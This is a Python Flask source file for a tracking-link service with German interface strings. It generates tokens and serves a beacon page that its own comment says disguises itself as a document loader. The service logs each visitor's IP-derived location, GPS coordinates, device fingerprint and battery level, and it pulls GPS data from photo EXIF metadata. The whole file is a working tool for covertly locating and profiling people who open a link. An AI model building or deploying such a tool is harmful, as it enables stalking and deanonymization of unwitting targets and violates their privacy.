import json
import io
import os
import sqlite3
import uuid
from datetime import datetime

import requests
from flask import (Flask, abort, jsonify, redirect, render_template,
                   request, url_for)
from PIL import Image
from PIL.ExifTags import GPSTAGS, TAGS

app = Flask(__name__)
DB_PATH = os.path.join(os.path.dirname(__file__), 'tracking.db')


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with get_db() as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS tokens (
                token      TEXT PRIMARY KEY,
                label      TEXT,
                created_at TEXT
            );
            CREATE TABLE IF NOT EXISTS events (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                token        TEXT,
                timestamp    TEXT,
                ip           TEXT,
                user_agent   TEXT,
                geo_country  TEXT,
                geo_city     TEXT,
                geo_lat      REAL,
                geo_lon      REAL,
                gps_lat      REAL,
                gps_lon      REAL,
                gps_accuracy REAL,
                screen       TEXT,
                timezone     TEXT,
                language     TEXT,
                battery      REAL,
                extra        TEXT
            );
        ''')


def geolocate_ip(ip):
    """Resolve IP to country/city/coords via ip-api.com (free, no key)."""
    try:
        resp = requests.get(
            f'http://ip-api.com/json/{ip}',
            params={'fields': 'status,country,city,lat,lon'},
            timeout=3,
        )
        data = resp.json()
        if data.get('status') == 'success':
            return data['country'], data['city'], data['lat'], data['lon']
    except Exception:
        pass
    return None, None, None, None


def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr


def extract_gps_from_exif(img_bytes):
    """Return {'lat': float, 'lon': float} or None if no GPS in EXIF."""
    try:
        img = Image.open(io.BytesIO(img_bytes))
        raw = img._getexif()
        if not raw:
            return None, {}

        all_tags = {TAGS.get(k, k): v for k, v in raw.items()}
        gps_raw = all_tags.get('GPSInfo', {})
        if not gps_raw:
            return None, all_tags

        def dms_to_dd(dms, ref):
            d, m, s = (float(x) for x in dms)
            dd = d + m / 60 + s / 3600
            return -dd if ref in ('S', 'W') else dd

        lat = lon = None
        if 2 in gps_raw and 4 in gps_raw:
            lat = dms_to_dd(gps_raw[2], gps_raw.get(1, 'N'))
            lon = dms_to_dd(gps_raw[4], gps_raw.get(3, 'E'))

        gps_readable = {GPSTAGS.get(k, k): str(v) for k, v in gps_raw.items()}
        coords = {'lat': round(lat, 6), 'lon': round(lon, 6)} if lat is not None else None
        return coords, gps_readable
    except Exception:
        return None, {}


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route('/')
def dashboard():
    with get_db() as conn:
        tokens = conn.execute(
            'SELECT * FROM tokens ORDER BY created_at DESC'
        ).fetchall()
        events = conn.execute(
            'SELECT * FROM events ORDER BY timestamp DESC LIMIT 200'
        ).fetchall()
    return render_template('dashboard.html', tokens=tokens, events=events)


@app.route('/generate', methods=['POST'])
def generate():
    label = request.form.get('label', 'Unbenannt').strip() or 'Unbenannt'
    token = str(uuid.uuid4())[:8]
    with get_db() as conn:
        conn.execute(
            'INSERT INTO tokens VALUES (?, ?, ?)',
            (token, label, datetime.utcnow().isoformat()),
        )
    return redirect(url_for('dashboard'))


@app.route('/delete/<token>', methods=['POST'])
def delete_token(token):
    with get_db() as conn:
        conn.execute('DELETE FROM events WHERE token=?', (token,))
        conn.execute('DELETE FROM tokens WHERE token=?', (token,))
    return redirect(url_for('dashboard'))


@app.route('/t/<token>')
def beacon(token):
    """The tracking link target — looks like a document loader."""
    with get_db() as conn:
        row = conn.execute(
            'SELECT * FROM tokens WHERE token=?', (token,)
        ).fetchone()
    if not row:
        abort(404)
    return render_template('beacon.html', token=token)


@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json(silent=True) or {}
    token = data.get('token', '')
    ip = get_client_ip()
    country, city, geo_lat, geo_lon = geolocate_ip(ip)

    with get_db() as conn:
        conn.execute(
            '''INSERT INTO events
               (token, timestamp, ip, user_agent,
                geo_country, geo_city, geo_lat, geo_lon,
                gps_lat, gps_lon, gps_accuracy,
                screen, timezone, language, battery, extra)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
            (
                token,
                datetime.utcnow().isoformat(),
                ip,
                request.headers.get('User-Agent', ''),
                country, city, geo_lat, geo_lon,
                data.get('gps_lat'), data.get('gps_lon'), data.get('gps_accuracy'),
                data.get('screen'),
                data.get('timezone'),
                data.get('language'),
                data.get('battery'),
                json.dumps(data.get('extra', {})),
            ),
        )
    return jsonify({'ok': True})


@app.route('/api/events')
def events_api():
    token = request.args.get('token')
    with get_db() as conn:
        if token:
            rows = conn.execute(
                'SELECT * FROM events WHERE token=? ORDER BY timestamp DESC',
                (token,),
            ).fetchall()
        else:
            rows = conn.execute(
                'SELECT * FROM events ORDER BY timestamp DESC LIMIT 200'
            ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route('/api/exif', methods=['POST'])
def exif_extract():
    if 'file' not in request.files:
        return jsonify({'error': 'Keine Datei angegeben'}), 400
    img_bytes = request.files['file'].read()
    coords, gps_tags = extract_gps_from_exif(img_bytes)
    return jsonify({'gps': coords, 'gps_tags': gps_tags})


if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5000)
